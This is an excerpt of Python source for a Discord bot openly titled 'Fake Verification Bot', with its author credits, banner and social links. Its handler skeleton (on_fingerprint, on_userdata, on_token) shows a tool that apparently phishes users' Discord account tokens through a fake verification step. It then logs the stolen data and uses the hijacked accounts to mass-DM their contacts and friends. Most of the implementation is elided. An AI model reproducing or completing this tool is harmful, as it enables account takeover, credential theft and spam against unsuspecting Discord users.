...
def bot_title():
    os.system("cls")
    ctypes.windll.kernel32.SetConsoleTitleW(f"Fake Verification Bot - Made By JustHarry#5308")
    print(f"""\n\n{Fore.RESET}                            ███████╗ █████╗ ██╗  ██╗███████╗    ██╗   ██╗███████╗██████╗ ██╗███████╗
                            ██╔════╝██╔══██╗██║ ██╔╝██╔════╝    ██║   ██║██╔════╝██╔══██╗██║██╔════╝
                            █████╗  ███████║█████╔╝ █████╗      ██║   ██║█████╗  ██████╔╝██║█████╗  
                            ██╔══╝  ██╔══██║██╔═██╗ ██╔══╝      ╚██╗ ██╔╝██╔══╝  ██╔══██╗██║██╔══╝  
                            ...
                            """.replace('█', f'{b}█{y}'))
    print(f"""{y}------------------------------------------------------------------------------------------------------------------------\n{w} Socials > | https://github.com/JustHarryTools | https://pasific.ml | https://discord.gg/vftnBF3AaM | Working 2023 V1 | {y}------------------------------------------------------------------------------------------------------------------------\n""".replace('|', f'{b}|{w}'))
...
bot = commands.Bot(command_prefix=prefix, description="Fake Verification Bot - Made By JustHarry#5308", intents=intents)
        ...
        async def on_fingerprint(data):
            ...
            async def on_userdata(user):
                ...
                async def on_token(token):
                    ...
                    if logs_channel:
                        embed_user.set_footer(text="Made By JustHarry#5308  ・  https://github.com/JustHarryTools")
                    ...
                    if give_role == True:
                        try:
                            ...
                            if logs_channel:
                                ...
                                embed_role.set_footer(text="Made By JustHarry#5308  ・  https://github.com/JustHarryTools")
                    ...
                    if mass_dm == 1 or mass_dm == 3:
                        try:
                            ...
                            if logs_channel:
                                ...
                                embed_cdm.set_footer(text="Made By JustHarry#5308  ・  https://github.com/JustHarryTools")
                    ...
                    if mass_dm == 2 or mass_dm == 3:
                        try:
                            ...
                            if logs_channel:
                                ...
                                embed_fdm.set_footer(text="Made By JustHarry#5308  ・  https://github.com/JustHarryTools")
